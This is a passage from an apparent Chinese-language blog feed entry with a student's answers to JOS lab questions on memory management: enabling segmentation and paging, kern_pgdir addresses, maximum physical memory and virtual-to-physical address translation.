title="A1"></a>A1</h3><ul><li><strong>分段机制</strong>：是 boot.S 中加载 GDT 并启用 cr0 保护模式后启用的<pre><code class="hljs perl"><span class="hljs-comment"># Switch from real to protected mode, using a bootstrap GDT</span><span class="hljs-comment"># and segment translation that makes virtual addresses </span><span class="hljs-comment"># identical to their physical addresses, so that the </span><span class="hljs-comment"># effective memory map does not change during the switch.</span>lgdt    gdtdescmovl    %cr0, %eaxorl     $CR0_PE_ON, %eaxmovl    %eax, %cr0</code></pre></li><li><strong>分页机制</strong>：是 entry.S 中加载了 entry_pgdir 后启用的<pre><code class="hljs perl"><span class="hljs-comment"># Load the physical address of entry_pgdir into cr3.  entry_pgdir</span><span class="hljs-comment"># is defined in entrypgdir.c.</span>movl  $(RELOC(entry_pgdir)), %eaxmovl  %eax, %cr3<span class="hljs-comment"># Turn on paging.</span>movl  %cr0, %eaxorl $(CR0_PE|CR0_PG|CR0_WP), %eaxmovl  %eax, %cr0</code></pre></li><li><strong>分页分段</strong>都启用后，CPU 便能处理虚拟地址</li></ul><h3 id="Q2"><a href="#Q2" class="headerlink" title="Q2"></a>Q2</h3><blockquote><p>mem_init()函数中 kern_pgdir 的虚拟地址是多少？物理地址呢？在我们还未完成本 次 lab 之前，为什么我们已经可以使用虚拟地址了？ </p></blockquote><h3 id="A2"><a href="#A2" class="headerlink" title="A2"></a>A2</h3><p><code>cprintf(&quot;%x\n&quot;, kern_pgdir);</code>得到结果 0xf011b000，对应物理地址 0x0011b000</p><p>因为在程序中已经完成了内核部分 4MB 大小的虚拟地址到物理地址的简单映射，在 kern/entry.S 与 kern/entrypgdir.c 中。</p><h3 id="Q3"><a href="#Q3" class="headerlink" title="Q3"></a>Q3</h3><blockquote><p> 哪一行代码使得本次 lab 所构建的虚拟内存系统真正被使用？请指出它的位置。</p></blockquote><h3 id="A3"><a href="#A3" class="headerlink" title="A3"></a>A3</h3><p>mem_init() 中的<code>lcr3(PADDR(kern_pgdir));</code></p><h3 id="Q4"><a href="#Q4" class="headerlink" title="Q4"></a>Q4</h3><blockquote><p>此操作系统可支持的最大物理内存是多少？为什么？</p></blockquote><h3 id="A4"><a href="#A4" class="headerlink" title="A4"></a>A4</h3><p>2GB的最大物理内存，所有空闲的物理页面最开始都放在了pages数组中，数组中每个struct大小为8B，UPAGES大小为PTSIZE，所以最多可存储512K个pageInfo，而每个结构对应页面大小4KB，所以最多可以管理2^19 *2^12 = 2^31 = 2GB</p><h3 id="Q5"><a href="#Q5" class="headerlink" title="Q5"></a>Q5</h3><blockquote><p>请详细描述在 JOS 中虚拟地址到物理地址的转换过程。</p></blockquote><h3 id="A5"><a href="#A5" class="headerlink" title="A5"></a>A5</h3><ul><li>在 inc/mmu.h 中的 PDX、PTX、PGOFF 三个宏将虚拟地址分为 31 - 22 位、21 - 12 位、11 - 0位的三段。</li><li>首先通过 cr3 寄存器找到页表目录的物理地址 kern_pgdir，以虚拟地址的高10位 <code>PDX(va)</code> 作为索引在页表目录中找对应的页表项，该表项储存次级页表的起始地址和标志位。</li><li>然后通过 <code>PTE_ADDR()</code> 取出将页表项的高 20 位得到次级页表的物理地址，以虚拟地址的中间 10 位 <code>PTX(va)</code> 为索引找到对应的页表项，该表项储存对应物理页框的地址。</li><li>最后将线性地址的低 12 位 <code>PGOFF(va)</code> 与物理页框起始地址相加就得到了虚拟地址 va 对应的物理地址 pa。</li></ul><h3 id="Q6"><a href="#Q6" class="headerlink" title="Q6"></a>Q6</h3><blockquote><p>在函数 pgdir_walk() 的上下文中，请说明以下地址的含义，并指出他们是虚拟地址还是物理地址：</p></blockquote><h3 id="A6"><a href="#A6" class="headerlink" title="A6"></a>A6</h3><ol><li>pgdir 页目录地址，是虚拟地址。 </li><li>pgtab = PTE_ADDR(pgdir[PDX(va)]) pgdir[PDX(va)] 是页表目录中以 PDX(va)为索引找到的页表项, 页表项中储存的都是物理地址。而宏 PTE_ADDR 则是去除这个地址的高 20 位，因此也是物理地址。</li><li>pg = PTE_ADDR(KADDR(pgtab)[PTX(va)]) pg 就是二级页表中对应这个地址的页表项，因此也是物理地址。</li></ol><h3 id="Q7"><a href="#Q7" class="headerlink" title="Q7"></a>Q7</h3><blockquote><p>画出本次 Lab 结束后虚拟地址空间与物理地址空间的映射关系，地址空间表示图中应至 少包含 kern_pgdir 与 pages，展示越多的细节越好。（提示：地址空间的表示方式可以 参考 Lab 1-“The PC’s Physical Address Space”小节）</p></blockquote><h3 id="A7"><a href="#A7" class="headerlink" title="A7"></a>A7</h3><p><img src="/2020/11/21/oslab-2-Memory-Management/2-7.png" srcset="/img/loading.gif" alt="2-7"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;lab-4：内存管理&quot;&gt;&lt;a href=&quot;#lab-4：内存管理&quot; class=&quot;headerlink&quot; title=&quot;lab 4：内存管理&quot;&gt;&lt;/a&gt;lab 4：内存管理&lt;/h1&gt;&lt;h2 id=&quot;Overview&quot;&gt;&lt;a href=&quot;#Overview&quot; cla</summary>
      
    
    
    
    
    <category term="Operating System" scheme="http://yoursite.com/tags/Operating-System/"/>
    
  </entry>
  
</feed>
